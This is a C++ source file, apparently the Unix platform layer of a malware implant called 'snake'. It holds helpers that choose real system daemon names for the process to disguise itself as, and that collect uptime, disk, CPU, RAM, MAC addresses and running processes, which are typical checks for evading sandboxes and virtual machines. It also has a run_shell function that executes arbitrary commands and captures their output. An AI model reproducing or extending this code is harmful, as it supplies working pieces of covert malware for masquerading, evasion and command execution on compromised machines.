#ifndef _WIN32

#include <dirent.h>
#include <poll.h>
#include <signal.h>
#include <sys/statvfs.h>
#include <sys/wait.h>
#include <unistd.h>

#include <chrono>
#include <cstdio>
#include <cstring>
#include <ctime>
#include <fcntl.h>

#include "snake/implant_platform.hpp"

namespace snake::implant {

namespace {

long long clock_nanos() {
    auto ns = std::chrono::high_resolution_clock::now().time_since_epoch();
    return (long long)std::chrono::duration_cast<std::chrono::nanoseconds>(ns).count();
}

}  // namespace

std::string hostname() {
    char h[256] = {0};
    if (::gethostname(h, sizeof(h) - 1) != 0) return "";
    h[sizeof(h) - 1] = '\0';
    return std::string(h);
}

std::string target_proc_name() {
#if defined(__APPLE__)
    static const char* targets[] = {"metadatah", "bird", "cloudd", "distnoted"};
    return targets[unsigned(clock_nanos() % 4)];
#elif defined(__linux__)
    static const char* targets[] = {"packagekitd", "systemd-journald", "irqbalance",
                                    "accounts-daemon"};
    return targets[unsigned(clock_nanos() % 4)];
#else
    return "service";
#endif
}

long long uptime_secs() {
#if defined(__linux__)
    FILE* f = std::fopen("/proc/uptime", "r");
    if (f != nullptr) {
        double up = 0;
        int got = std::fscanf(f, "%lf", &up);
        std::fclose(f);
        if (got == 1) return (long long)up;
    }
#endif
    return 999999;
}

double disk_total_gb() {
#if defined(__linux__)
    struct statvfs sv;
    if (::statvfs("/", &sv) == 0) {
        double bs = double(sv.f_frsize ? sv.f_frsize : sv.f_bsize);
        return bs * double(sv.f_blocks) / (1024.0 * 1024.0 * 1024.0);
    }
#endif
    return 999.0;
}

int num_cpu() {
    long n = ::sysconf(_SC_NPROCESSORS_ONLN);
    return n > 0 ? (int)n : 1;
}

int local_hour() {
    std::time_t t = std::time(nullptr);
    std::tm tmv{};
    ::localtime_r(&t, &tmv);
    return tmv.tm_hour;
}

long long ram_total_mb() {
#if defined(__linux__)
    FILE* f = std::fopen("/proc/meminfo", "r");
    if (f != nullptr) {
        char line[256];
        while (std::fgets(line, sizeof(line), f) != nullptr) {
            long long kb = 0;
            if (std::sscanf(line, "MemTotal: %lld kB", &kb) == 1) {
                std::fclose(f);
                return kb / 1024;
            }
        }
        std::fclose(f);
    }
#endif
    return 0;
}

std::vector<std::string> mac_addresses() {
    std::vector<std::string> out;
#if defined(__linux__)
    DIR* d = ::opendir("/sys/class/net");
    if (d == nullptr) return out;
    while (struct dirent* e = ::readdir(d)) {
        if (e->d_name[0] == '.') continue;
        std::string path = std::string("/sys/class/net/") + e->d_name + "/address";
        FILE* f = std::fopen(path.c_str(), "r");
        if (f == nullptr) continue;
        char buf[64] = {0};
        if (std::fgets(buf, sizeof(buf), f) != nullptr) {
            std::string mac(buf);
            while (!mac.empty() && (mac.back() == '\n' || mac.back() == '\r' || mac.back() == ' ')) {
                mac.pop_back();
            }
            if (!mac.empty()) out.push_back(mac);
        }
        std::fclose(f);
    }
    ::closedir(d);
#endif
    return out;
}

std::vector<std::string> running_process_names() {
    std::vector<std::string> out;
#if defined(__linux__)
    DIR* d = ::opendir("/proc");
    if (d == nullptr) return out;
    while (struct dirent* e = ::readdir(d)) {
        if (e->d_name[0] < '0' || e->d_name[0] > '9') continue;
        std::string path = std::string("/proc/") + e->d_name + "/comm";
        FILE* f = std::fopen(path.c_str(), "r");
        if (f == nullptr) continue;
        char buf[256] = {0};
        if (std::fgets(buf, sizeof(buf), f) != nullptr) {
            std::string name(buf);
            while (!name.empty() && (name.back() == '\n' || name.back() == '\r')) name.pop_back();
            if (!name.empty()) out.push_back(name);
        }
        std::fclose(f);
    }
    ::closedir(d);
#endif
    return out;
}

ShellOutput run_shell(const std::string& cmd) {
    ShellOutput r;
    int op[2], ep[2];
    if (::pipe(op) != 0 || ::pipe(ep) != 0) return r;
    pid_t pid = ::fork();
    if (pid < 0) {
        ::close(op[0]);
        ::close(op[1]);
        ::close(ep[0]);
        ::close(ep[1]);
        return r;
    }
    if (pid == 0) {
        ::dup2(op[1], STDOUT_FILENO);
        ::dup2(ep[1], STDERR_FILENO);
        ::close(op[0]);
        ::close(op[1]);
        ::close(ep[0]);
        ::close(ep[1]);
        ::execl("/bin/sh", "sh", "-c", cmd.c_str(), (char*)nullptr);
        ::_exit(127);
    }
    ::close(op[1]);
    ::close(ep[1]);
    ::fcntl(op[0], F_SETFL, O_NONBLOCK);
    ::fcntl(ep[0], F_SETFL, O_NONBLOCK);
    const auto deadline = std::chrono::steady_clock::now() + std::chrono::seconds(30);
    bool o_done = false, e_done = false;
    char buf[4096];
    while (!(o_done && e_done)) {
        struct pollfd pfds[2] = {{op[0], POLLIN, 0}, {ep[0], POLLIN, 0}};
        int pr = ::poll(pfds, 2, 100);
        if (pr > 0) {
            if (!o_done && (pfds[0].revents & (POLLIN | POLLHUP | POLLERR))) {
                ssize_t n = ::read(op[0], buf, sizeof(buf));
                if (n > 0) {
                    r.out.append(buf, (size_t)n);
                } else {
                    o_done = true;
                }
            }
            if (!e_done && (pfds[1].revents & (POLLIN | POLLHUP | POLLERR))) {
                ssize_t n = ::read(ep[0], buf, sizeof(buf));
                if (n > 0) {
                    r.err.append(buf, (size_t)n);
                } else {
                    e_done = true;
                }
            }
        }
        if (std::chrono::steady_clock::now() > deadline) {
            r.timed_out = true;
            ::kill(pid, SIGKILL);
            break;
        }
    }
    ::close(op[0]);
    ::close(ep[0]);
    int st = 0;
    ::waitpid(pid, &st, 0);
    if (!r.timed_out) {
        if (WIFEXITED(st)) {
            r.exit_code = WEXITSTATUS(st);
        } else if (WIFSIGNALED(st)) {
            r.signaled = true;
            r.signal_no = WTERMSIG(st);
        }
    }
    return r;
}

}  // namespace snake::implant

#endif  // !_WIN32
